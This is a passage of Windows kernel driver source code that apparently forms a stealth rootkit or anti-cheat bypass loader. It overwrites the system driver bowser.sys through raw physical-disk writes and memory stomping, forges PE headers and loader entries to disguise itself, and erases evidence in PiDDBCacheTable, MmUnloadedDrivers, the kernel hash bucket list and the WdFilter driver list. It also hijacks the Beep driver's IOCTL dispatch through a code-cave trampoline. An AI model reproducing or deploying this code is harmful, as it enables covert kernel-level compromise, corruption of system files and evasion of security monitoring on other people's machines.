    p0Buf[p0Off++] = L'r'; p0Buf[p0Off++] = L't'; p0Buf[p0Off++] = L'i';
    p0Buf[p0Off++] = L't'; p0Buf[p0Off++] = L'i'; p0Buf[p0Off++] = L'o';
    p0Buf[p0Off++] = L'n'; p0Buf[p0Off++] = L'0'; p0Buf[p0Off] = L'\0';

    const WCHAR* physCandidates[2] = { dr0Buf, p0Buf };
    HANDLE hVol = NULL;
    IO_STATUS_BLOCK iosb4 = {};

    for (int ci = 0; ci < 2 && hVol == NULL; ci++) {
        UNICODE_STRING physPath = {};
        RtlInitUnicodeString(&physPath, physCandidates[ci]);
        InitializeObjectAttributes(&oa, &physPath,
                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
        IO_STATUS_BLOCK iosbTry = {};
        HANDLE hTry = NULL;
        NTSTATUS stTry = ZwCreateFile(&hTry,
                          FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosbTry,
                          NULL, 0,
                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                          FILE_OPEN,
                          FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT |
                          FILE_NO_INTERMEDIATE_BUFFERING,
                          NULL, 0);
        if (NT_SUCCESS(stTry)) {
            hVol = hTry; iosb4 = iosbTry;
            LOG("[~] RawDisk: opened physical device %ls  disk=%u partOff=0x%llX\n",
                physCandidates[ci], diskNum, (unsigned long long)partStart);
        } else {
            LOG("[~] RawDisk: %ls failed 0x%08X - trying next\n", physCandidates[ci], stTry);
            st = stTry;
        }
    }
    if (!hVol) {
        g_drvStatus.RawDiskStep     = RD_STEP_PHYS_OPEN;
        g_drvStatus.RawDiskNtStatus = (unsigned long)st;
        LOG("[!] RawDisk: all physical disk paths failed  disk=%u\n", diskNum); return FALSE;
    }

    
    
    
    
    ULONG alignedSize = (size + bytesPerSector - 1) & ~(bytesPerSector - 1);
    PVOID alignedBuf  = ExAllocatePoolWithTag(NonPagedPool, alignedSize, 'lsFM');
    if (!alignedBuf) {
        g_drvStatus.RawDiskStep     = RD_STEP_ALLOC;
        g_drvStatus.RawDiskNtStatus = (unsigned long)STATUS_INSUFFICIENT_RESOURCES;
        LOG("[!] RawDisk: alloc %u bytes failed\n", alignedSize);
        ZwClose(hVol); return FALSE;
    }
    RtlCopyMemory(alignedBuf, data, size);
    if (alignedSize > size) RtlZeroMemory((PUCHAR)alignedBuf + size, alignedSize - size);

    
    
    
    
    LONGLONG prevVcn = rpb.StartingVcn.QuadPart;   
    BOOLEAN  anyOk   = FALSE;
    BOOLEAN  allOk   = TRUE;

    for (ULONG i = 0; i < rpb.ExtentCount; i++) {
        LONGLONG lcn     = rpb.Extents[i].Lcn.QuadPart;
        LONGLONG nextVcn = rpb.Extents[i].NextVcn.QuadPart;
        ULONG    fileOff = (ULONG)((prevVcn - rpb.StartingVcn.QuadPart) * (LONGLONG)bytesPerCluster);

        if (fileOff >= size) break;     
        if (lcn < 0) { prevVcn = nextVcn; continue; }  

        ULONG extBytes  = (ULONG)((nextVcn - prevVcn) * (LONGLONG)bytesPerCluster);
        ULONG dataBytes = (fileOff + extBytes <= size) ? extBytes : (size - fileOff);
        
        
        ULONG writeSize = (dataBytes + bytesPerSector - 1) & ~(bytesPerSector - 1);

        LARGE_INTEGER volOff;
        volOff.QuadPart = partStart + lcn * (LONGLONG)bytesPerCluster;

        IO_STATUS_BLOCK iosbW = {};
        st = ZwWriteFile(hVol, NULL, NULL, NULL, &iosbW,
                         (PUCHAR)alignedBuf + fileOff, writeSize, &volOff, NULL);
        if (NT_SUCCESS(st)) {
            anyOk = TRUE;
        } else {
            g_drvStatus.RawDiskStep     = RD_STEP_WRITE;
            g_drvStatus.RawDiskNtStatus = (unsigned long)st;
            LOG("[!] RawDisk: ZwWriteFile extent %u vol+0x%llX failed 0x%08X\n",
                i, (unsigned long long)volOff.QuadPart, st);
            allOk = FALSE; break;
        }
        prevVcn = nextVcn;
    }

    ExFreePoolWithTag(alignedBuf, 'lsFM');
    ZwClose(hVol);

    if (!anyOk && allOk) {
        
        
        
        g_drvStatus.RawDiskStep     = RD_STEP_ALL_SPARSE;
        g_drvStatus.RawDiskNtStatus = 0;
        LOG("[!] RawDisk: all extents sparse/virtual (%u extents, LCN=-1) - file is compressed?\n",
            rpb.ExtentCount);
    }

    if (anyOk && allOk) {
        g_drvStatus.RawDiskStep     = RD_STEP_OK;
        g_drvStatus.RawDiskNtStatus = 0;
        LOG("[+] RawDisk: fully wrote %wZ via %wZ\n", filePath, &volPath);
    } else if (anyOk) {
        LOG("[~] RawDisk: partially wrote %wZ via %wZ\n", filePath, &volPath);
    }
    return anyOk && allOk;
}

static BOOLEAN WriteStageToDisk(PUNICODE_STRING filePath, PVOID data, ULONG size) {
    
    
    
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    IO_STATUS_BLOCK iosb = {};
    HANDLE hFile = NULL;
    NTSTATUS st = ZwCreateFile(
        &hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        &oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OVERWRITE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);
    if (!NT_SUCCESS(st)) {
        LOG("[!] DiskSync: ZwCreateFile failed 0x%X (expected while driver is loaded)\n", st);
        return FALSE;
    }
    LARGE_INTEGER offset = {};
    st = ZwWriteFile(hFile, NULL, NULL, NULL, &iosb, data, size, &offset, NULL);
    ZwClose(hFile);
    if (!NT_SUCCESS(st)) {
        LOG("[!] DiskSync: ZwWriteFile failed 0x%X\n", st);
        return FALSE;
    }
    LOG("[+] DiskSync: wrote 0x%X bytes to %wZ\n", size, filePath);
    return TRUE;
}

static PVOID StompIntoRdbss(PVOID ntBase, PVOID selfBase) {
    PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
    if (!selfNt) return nullptr;
    ULONG imageSize = selfNt->OptionalHeader.SizeOfImage;
    if (!imageSize) return nullptr;

    PLDR_DATA_TABLE_ENTRY rdbssLdr = FindModuleLdrEntry(ntBase, L"bowser.sys");
    if (!rdbssLdr) {
        LOG("[!] Stomp: bowser.sys not found in PsLoadedModuleList\n");
        return nullptr;
    }
    PVOID rdbssBase = rdbssLdr->DllBase;
    if (rdbssLdr->SizeOfImage < imageSize) {
        LOG("[!] Stomp: bowser.sys (%u) < payload (%u)\n", rdbssLdr->SizeOfImage, imageSize);
        return nullptr;
    }

    
    PIMAGE_NT_HEADERS origNt = RtlImageNtHeader(rdbssBase);

    
    
    PVOID stage = ExAllocatePoolWithTag(NonPagedPool, imageSize, 'tSmM');
    if (!stage) return nullptr;
    RtlCopyMemory(stage, selfBase, imageSize);

    LONGLONG delta = (LONGLONG)((ULONG_PTR)rdbssBase - (ULONG_PTR)selfBase);
    if (delta != 0) {
        PIMAGE_NT_HEADERS stNt = RtlImageNtHeader(stage);
        if (stNt) {
            ULONG relocRva = stNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            ULONG relocSz  = stNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            if (relocRva && relocSz) {
                PIMAGE_BASE_RELOCATION blk = (PIMAGE_BASE_RELOCATION)((PUCHAR)stage + relocRva);
                PIMAGE_BASE_RELOCATION end = (PIMAGE_BASE_RELOCATION)((PUCHAR)blk + relocSz);
                while (blk < end && blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                    ULONG   cnt  = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
                    PUSHORT ents = (PUSHORT)(blk + 1);
                    PUCHAR  base = (PUCHAR)stage + blk->VirtualAddress;
                    for (ULONG i = 0; i < cnt; i++) {
                        if ((ents[i] >> 12) == IMAGE_REL_BASED_DIR64)
                            *(LONGLONG*)(base + (ents[i] & 0x0FFF)) += delta;
                    }
                    blk = (PIMAGE_BASE_RELOCATION)((PUCHAR)blk + blk->SizeOfBlock);
                }
            }
        }
    }

    
    
    
    
    if (origNt) {
        PIMAGE_NT_HEADERS stNt = RtlImageNtHeader(stage);
        if (stNt) {
            stNt->FileHeader.TimeDateStamp                    = origNt->FileHeader.TimeDateStamp;
            stNt->FileHeader.Characteristics                  = origNt->FileHeader.Characteristics;
            stNt->OptionalHeader.ImageBase                    = origNt->OptionalHeader.ImageBase;
            stNt->OptionalHeader.SizeOfImage                  = origNt->OptionalHeader.SizeOfImage;
            stNt->OptionalHeader.SizeOfCode                   = origNt->OptionalHeader.SizeOfCode;
            stNt->OptionalHeader.SizeOfInitializedData        = origNt->OptionalHeader.SizeOfInitializedData;
            stNt->OptionalHeader.SizeOfUninitializedData      = origNt->OptionalHeader.SizeOfUninitializedData;
            stNt->OptionalHeader.CheckSum                     = origNt->OptionalHeader.CheckSum;
            stNt->OptionalHeader.MajorImageVersion            = origNt->OptionalHeader.MajorImageVersion;
            stNt->OptionalHeader.MinorImageVersion            = origNt->OptionalHeader.MinorImageVersion;
            stNt->OptionalHeader.MajorSubsystemVersion        = origNt->OptionalHeader.MajorSubsystemVersion;
            stNt->OptionalHeader.MinorSubsystemVersion        = origNt->OptionalHeader.MinorSubsystemVersion;
            g_drvStatus.HdrPatched = 1;
            LOG("[+] HdrPatch: TimeDateStamp=0x%X SizeOfImage=0x%X CheckSum=0x%X\n",
                origNt->FileHeader.TimeDateStamp,
                origNt->OptionalHeader.SizeOfImage,
                origNt->OptionalHeader.CheckSum);

            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            {
                USHORT origSections  = origNt->FileHeader.NumberOfSections;
                USHORT stageSections = stNt->FileHeader.NumberOfSections;

                PIMAGE_SECTION_HEADER origSec  = IMAGE_FIRST_SECTION(origNt);
                PIMAGE_SECTION_HEADER stageSec = IMAGE_FIRST_SECTION(stNt);

                
                ULONG_PTR secOff = (ULONG_PTR)stageSec - (ULONG_PTR)stage;
                ULONG     hdrSz  = stNt->OptionalHeader.SizeOfHeaders;
                USHORT    maxFit = (secOff < hdrSz)
                    ? (USHORT)((hdrSz - secOff) / sizeof(IMAGE_SECTION_HEADER))
                    : 0;

                USHORT copyCount = (origSections < maxFit) ? origSections : maxFit;

                RtlCopyMemory(stageSec, origSec, copyCount * sizeof(IMAGE_SECTION_HEADER));

                
                
                if (stageSections > copyCount)
                    RtlZeroMemory(stageSec + copyCount,
                                  (stageSections - copyCount) * sizeof(IMAGE_SECTION_HEADER));

                stNt->FileHeader.NumberOfSections  = copyCount;
                stNt->OptionalHeader.SizeOfHeaders = origNt->OptionalHeader.SizeOfHeaders;
                g_drvStatus.SectionHdrPatched = 1;
                LOG("[+] SectionHdrPatch: %u bowser sections overlaid (payload had %u)\n",
                    copyCount, stageSections);
            }
        }
    }

    
    
    
    
    
    
    
    
    if (WriteStageToDiskRaw(&rdbssLdr->FullDllName, stage, imageSize)) {
        g_drvStatus.RawDiskSynced = 1;
        g_drvStatus.DiskSynced    = 1;
    } else {
        
        
        
        
        
        
        
        
        
        static WCHAR g_fakeBuf[256]   = {};
        static WCHAR kFakeBaseName[]  = L"bowser.sys";
        static const WCHAR kFallback[] =
            L"\\SystemRoot\\System32\\DriverStore\\FileRepository\\bowser.inf_amd64_b3cf4a9e_00000000\\bowser.sys";

        PWCHAR fakePath = const_cast<PWCHAR>(kFallback);

        
        
        
        {
            UNICODE_STRING repoPath = RTL_CONSTANT_STRING(
                L"\\SystemRoot\\System32\\DriverStore\\FileRepository");
            OBJECT_ATTRIBUTES repoOa;
            IO_STATUS_BLOCK   repoIosb = {};
            InitializeObjectAttributes(&repoOa, &repoPath,
                                       OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                       NULL, NULL);
            HANDLE hRepo = NULL;
            NTSTATUS stR = ZwCreateFile(&hRepo,
                FILE_LIST_DIRECTORY | SYNCHRONIZE, &repoOa, &repoIosb,
                NULL, 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                FILE_OPEN,
                FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
            if (NT_SUCCESS(stR)) {
                
                
                
                #pragma pack(push,1)
                struct MY_DIR_INFO {
                    ULONG NextEntryOffset;
                    ULONG FileIndex;
                    LARGE_INTEGER CreationTime;
                    LARGE_INTEGER LastAccessTime;
                    LARGE_INTEGER LastWriteTime;
                    LARGE_INTEGER ChangeTime;
                    LARGE_INTEGER EndOfFile;
                    LARGE_INTEGER AllocationSize;
                    ULONG FileAttributes;
                    ULONG FileNameLength;
                    WCHAR FileName[1];
                };
                #pragma pack(pop)

                static const WCHAR kPrefix[] = L"bowser.inf_amd64_";
                const ULONG kPrefixLen = (sizeof(kPrefix) / sizeof(WCHAR)) - 1;

                UCHAR dirBuf[512] = {};
                UNICODE_STRING filter = RTL_CONSTANT_STRING(L"bowser.inf_amd64_*");
                IO_STATUS_BLOCK qIosb = {};
                NTSTATUS stQ = ZwQueryDirectoryFile(hRepo, NULL, NULL, NULL,
                    &qIosb, dirBuf, sizeof(dirBuf),
                    FileDirectoryInformation, FALSE, &filter, TRUE);
                if (NT_SUCCESS(stQ)) {
                    MY_DIR_INFO* di = (MY_DIR_INFO*)dirBuf;
                    ULONG nameChars = di->FileNameLength / sizeof(WCHAR);
                    if (nameChars >= kPrefixLen && nameChars < 128) {
                        
                        
                        static const WCHAR kBase[] =
                            L"\\SystemRoot\\System32\\DriverStore\\FileRepository\\";
                        const ULONG kBaseChars = (sizeof(kBase) / sizeof(WCHAR)) - 1;
                        const WCHAR kSuffix[]  = L"\\bowser.sys";
                        const ULONG kSuffixChars = (sizeof(kSuffix) / sizeof(WCHAR)) - 1;

                        if (kBaseChars + nameChars + kSuffixChars + 1 < ARRAYSIZE(g_fakeBuf)) {
                            RtlCopyMemory(g_fakeBuf, kBase, kBaseChars * sizeof(WCHAR));
                            RtlCopyMemory(g_fakeBuf + kBaseChars,
                                          di->FileName, nameChars * sizeof(WCHAR));
                            
                            
                            ULONG flipIdx = kBaseChars + nameChars - 1;
                            WCHAR c = g_fakeBuf[flipIdx];
                            g_fakeBuf[flipIdx] = (c == L'f' || c == L'F') ? L'0' : c + 1;
                            RtlCopyMemory(g_fakeBuf + kBaseChars + nameChars,
                                          kSuffix, kSuffixChars * sizeof(WCHAR));
                            g_fakeBuf[kBaseChars + nameChars + kSuffixChars] = L'\0';
                            fakePath = g_fakeBuf;
                            LOG("[+] LdrPoison: resolved DriverStore path → %ls\n", fakePath);
                        }
                    }
                }
                ZwClose(hRepo);
            }
        }

        g_savedFullDllName = rdbssLdr->FullDllName;
        g_savedBaseDllName = rdbssLdr->BaseDllName;
        g_poisonedLdr      = rdbssLdr;
        RtlInitUnicodeString(&rdbssLdr->FullDllName, fakePath);
        RtlInitUnicodeString(&rdbssLdr->BaseDllName, kFakeBaseName);
        g_drvStatus.DiskSynced = 1;
        LOG("[+] LdrPoison: FullDllName+BaseDllName → %ls\n", fakePath);
    }

    
    
    ULONG_PTR statusOff = (ULONG_PTR)&g_drvStatus - (ULONG_PTR)selfBase;
    if (statusOff + sizeof(BYPASS_STATUS) <= imageSize)
        RtlCopyMemory((PUCHAR)stage + statusOff, &g_drvStatus, sizeof(BYPASS_STATUS));

    
    BOOLEAN ok = TRUE;
    for (SIZE_T off = 0; off < imageSize; off += PAGE_SIZE) {
        SIZE_T chunk = min((SIZE_T)PAGE_SIZE, imageSize - off);
        if (!WritePhysPage((PUCHAR)rdbssBase + off, (PUCHAR)stage + off, chunk)) {
            LOG("[!] Stomp: WritePhysPage failed at offset 0x%zX\n", off);
            ok = FALSE;
            break;
        }
    }

    ExFreePoolWithTag(stage, 'tSmM');

    if (!ok) return nullptr;

    LOG("[+] Stomp: image written to bowser.sys base=%p size=0x%X delta=0x%llX\n",
        rdbssBase, imageSize, (unsigned long long)delta);
    return rdbssBase;
}





VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    RemoveWalkChainHook();

    
    
    
    UNICODE_STRING lnkName = RTL_CONSTANT_STRING(COMM_SYMLINK_NAME);
    IoDeleteSymbolicLink(&lnkName);
    if (g_pDevice) {
        IoDeleteDevice(g_pDevice);
        g_pDevice = nullptr;
    }

    
    if (g_borrowedDrv) {
        g_borrowedDrv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = g_origDevCtrl;
        ObDereferenceObject(g_borrowedDrv);
        g_borrowedDrv = nullptr;
    } else if (DriverObject) {
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = g_origDevCtrl;
    }

    
    if (g_poisonedLdr) {
        g_poisonedLdr->FullDllName = g_savedFullDllName;
        g_poisonedLdr->BaseDllName = g_savedBaseDllName;
        g_poisonedLdr = nullptr;
    }

    ZeroCave();

    PVOID ntBase = GetNtKernelBase(DriverObject);
    if (ntBase && DriverObject) ClearMmUnloadedDrivers(DriverObject, ntBase);
}

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
                                 _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    
    
    
    PVOID ntBase = DriverObject ? GetNtKernelBase(DriverObject) : nullptr;
    if (!ntBase) ntBase = GetNtKernelBaseAlt();

    g_drvStatus.KDUPath = DriverObject ? 0 : 1;
    g_drvStatus.NtBase       = (ULONGLONG)ntBase;
    g_ntBase                 = ntBase;

    if (DriverObject) {
        DriverObject->DriverUnload = DriverUnload;

        if (ntBase) {
            ClearPiDDBCacheTable(DriverObject, ntBase);
            ClearMmUnloadedDrivers(DriverObject, ntBase);
        } else {
            LOG("[!] DriverEntry: ntoskrnl base not found — traces not cleared\n");
        }

        ZeroOwnTimestamp(DriverObject);
    }

    
    if (ntBase) {
        InstallWalkChainHook(ntBase);
    } else {
        LOG("[!] DriverEntry: ntBase unavailable — WalkChainHook not installed\n");
    }

    
    
    if (ntBase) {
        UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
        ClearPiDDBEntryByName(ntBase, &vehicleName);
        ClearUnloadedEntryByName(ntBase, &vehicleName);
        ClearKernelHashBucketList(ntBase);
        ClearWdFilterDriverList(ntBase);
    }

    
    
    
    
    
    
    PDRIVER_OBJECT pDevOwner = DriverObject;

    if (!pDevOwner) {
        
        
        
        
        
        
        
        UNICODE_STRING beepName = RTL_CONSTANT_STRING(L"\\Driver\\Beep");
        NTSTATUS borrowStatus = ObReferenceObjectByName(
            &beepName, OBJ_CASE_INSENSITIVE, nullptr, 0,
            *IoDriverObjectType, KernelMode, nullptr, (PVOID*)&pDevOwner);
        if (!NT_SUCCESS(borrowStatus) || !pDevOwner) {
            LOG("[!] DriverEntry: failed to borrow \\Driver\\Beep (0x%08X) — comm unavailable\n",
                borrowStatus);
            return STATUS_SUCCESS;
        }
        g_borrowedDrv = pDevOwner;

        
        
        
        
        PDRIVER_DISPATCH dispFn = InstallCaveTrampoline(ntBase, pDevOwner);
        if (!dispFn) dispFn = DispatchIoctl;

        g_origDevCtrl = pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL];
        pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispFn;

        
        g_pDevice = pDevOwner->DeviceObject;

        
        
        
        
        if (ntBase) {
            
            
            g_mmUnloadedArr = FindMmUnloadedArray(ntBase);

            PVOID selfBase = FindSelfBase((PVOID)(ULONG_PTR)DriverEntry);
            if (selfBase) {
                g_drvStatus.PoolStomped = 1;
                PVOID newBase = StompIntoRdbss(ntBase, selfBase);
                if (newBase && g_cavePtr) {
                    
                    
                    
                    LONGLONG delta    = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
                    PVOID newDispatch = (PVOID)((PUCHAR)DispatchIoctl + delta);
                    WriteStubToCave(g_cavePtr, newDispatch, 0xCC);
                    LOG("[+] DriverEntry: cave → rdbss.sys::DispatchIoctl=%p\n", newDispatch);

                    
                    
                    
                    
                    
                    PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
                    if (selfNt) {
                        g_drvStatus.PoolScrubbed = 1;
                        ULONG_PTR statusOff = (ULONG_PTR)&g_drvStatus - (ULONG_PTR)selfBase;
                        WritePhysPage((PUCHAR)newBase + statusOff,
                                      &g_drvStatus, sizeof(BYPASS_STATUS));
                        
                        
                        
                        
                        
                        
                        RtlZeroMemory(selfBase, selfNt->OptionalHeader.SizeOfHeaders);
                    }
                } else {
                    g_drvStatus.PoolStomped = 0;
                    LOG("[!] DriverEntry: stomp failed — dispatch remains in pool\n");
                }
            }
        }

        
        KeInitializeTimerEx(&g_vehicleTimer, SynchronizationTimer);
        KeInitializeDpc(&g_vehicleDpc, VehicleTimerDpc, &g_vehicleWork);
        g_vehicleWork.Attempt = 0;
        LARGE_INTEGER due;
        due.QuadPart = -20000000LL; 
        KeSetTimer(&g_vehicleTimer, due, &g_vehicleDpc);

        LOG("[+] DriverEntry: hijacked \\Device\\Beep for comm\n");
        return STATUS_SUCCESS;
    }

    
    g_origDevCtrl = pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    {
        PDRIVER_DISPATCH dispFn = InstallCaveTrampoline(ntBase, pDevOwner);
        if (!dispFn) dispFn = DispatchIoctl;
        pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispFn;
    }

    UNICODE_STRING devName = RTL_CONSTANT_STRING(COMM_DEVICE_NAME);
    UNICODE_STRING lnkName = RTL_CONSTANT_STRING(COMM_SYMLINK_NAME);

    NTSTATUS status = IoCreateDevice(pDevOwner, 0, &devName,
                                     FILE_DEVICE_UNKNOWN, 0, FALSE, &g_pDevice);
    if (!NT_SUCCESS(status)) {
        LOG("[!] DriverEntry: IoCreateDevice failed: 0x%08X\n", status);
        pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = g_origDevCtrl;
        ZeroCave();
        return status;
    }
    g_pDevice->Flags |= DO_BUFFERED_IO;
    g_pDevice->Flags &= ~DO_DEVICE_INITIALIZING;

    status = IoCreateSymbolicLink(&lnkName, &devName);
    if (!NT_SUCCESS(status)) {
        LOG("[!] DriverEntry: IoCreateSymbolicLink failed: 0x%08X\n", status);
        IoDeleteDevice(g_pDevice);
        g_pDevice = nullptr;
        pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = g_origDevCtrl;
        ZeroCave();
        return status;
    }

    LOG("[+] DriverEntry: comm device ready — %S\n", COMM_DEVICE_PATH);
    return STATUS_SUCCESS;
}